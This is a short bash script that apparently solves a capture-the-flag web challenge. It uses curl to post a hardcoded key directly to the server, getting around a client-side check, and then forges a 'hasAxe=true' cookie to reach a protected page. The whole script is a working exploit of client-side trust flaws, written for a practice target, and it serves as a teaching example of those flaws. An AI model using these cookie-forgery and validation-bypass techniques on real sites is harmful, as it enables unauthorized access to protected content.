#!/bin/bash
set -euo pipefail

base_url="http://browser-boss-fight.web.ctf.umasscybersec.org:48003"
cookie_jar="$(/usr/bin/mktemp)"
trap '/bin/rm -f "$cookie_jar"' EXIT

# Step 1: bypass the client-side key rewrite by posting the real key directly.
/usr/bin/curl -sS -c "$cookie_jar" \
  -d 'key=under_the_doormat' \
  "$base_url/password-attempt" >/dev/null

# Step 2: override the client-controlled hasAxe cookie while keeping the server session.
/usr/bin/curl -sS -b "$cookie_jar" -b 'hasAxe=true' \
  "$base_url/bowsers_castle.html"